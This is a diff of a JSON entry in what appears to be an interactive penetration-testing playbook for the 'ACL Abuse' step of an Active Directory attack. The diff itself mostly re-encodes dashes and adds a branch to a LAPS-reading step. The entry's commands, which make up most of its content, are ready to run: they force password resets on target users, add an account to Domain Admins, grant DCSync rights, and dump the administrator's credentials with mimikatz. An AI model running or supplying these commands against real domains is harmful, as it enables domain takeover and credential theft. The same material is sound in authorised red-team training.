@@ -2,8 +2,8 @@
   "id": "acl_abuse",
   "phase": "AD",
   "title": "ACL Abuse",
-  "body": "BloodHound showed you a misconfigured ACL. GenericAll, GenericWrite, WriteDACL, ForceChangePassword — all paths to escalation.",
-  "cmd": "# GenericAll over user — force password reset\nSet-DomainUserPassword -Identity targetuser \\\n  -AccountPassword (ConvertTo-SecureString 'Hack3d!23' -AsPlainText -Force)\n\n# GenericAll over group — add yourself\nAdd-DomainGroupMember -Identity 'Domain Admins' -Members 'youruser'\n\n# WriteDACL — grant yourself DCSync\nAdd-DomainObjectAcl \\\n  -TargetIdentity \"DC=domain,DC=com\" \\\n  -PrincipalIdentity youruser \\\n  -Rights DCSync\n\n# ForceChangePassword\ncred = New-Object System.Net.NetworkCredential(\"\",\"NewPass123!\")\nSet-DomainUserPassword -Identity target -AccountPassword cred.SecurePassword\n\n# DCSync once you have rights\n.\\mimikatz.exe \"privilege::debug\" \\\n  \"lsadump::dcsync /domain:domain.com /user:administrator\" \"exit\"",
+  "body": "BloodHound showed you a misconfigured ACL. GenericAll, GenericWrite, WriteDACL, ForceChangePassword \u2014 all paths to escalation.",
+  "cmd": "# GenericAll over user \u2014 force password reset\nSet-DomainUserPassword -Identity targetuser \\\n  -AccountPassword (ConvertTo-SecureString 'Hack3d!23' -AsPlainText -Force)\n\n# GenericAll over group \u2014 add yourself\nAdd-DomainGroupMember -Identity 'Domain Admins' -Members 'youruser'\n\n# WriteDACL \u2014 grant yourself DCSync\nAdd-DomainObjectAcl \\\n  -TargetIdentity \"DC=domain,DC=com\" \\\n  -PrincipalIdentity youruser \\\n  -Rights DCSync\n\n# ForceChangePassword\ncred = New-Object System.Net.NetworkCredential(\"\",\"NewPass123!\")\nSet-DomainUserPassword -Identity target -AccountPassword cred.SecurePassword\n\n# DCSync once you have rights\n.\\mimikatz.exe \"privilege::debug\" \\\n  \"lsadump::dcsync /domain:domain.com /user:administrator\" \"exit\"",
   "warn": null,
   "choices": [
     {
@@ -11,8 +11,12 @@
       "next": "dcsync"
     },
     {
-      "label": "Added self to Domain Admins — lateral move",
+      "label": "Added self to Domain Admins \u2014 lateral move",
       "next": "lateral_movement"
+    },
+    {
+      "label": "Reader can read LAPS \u2014 pull local admin",
+      "next": "laps_read"
     }
   ]
 }
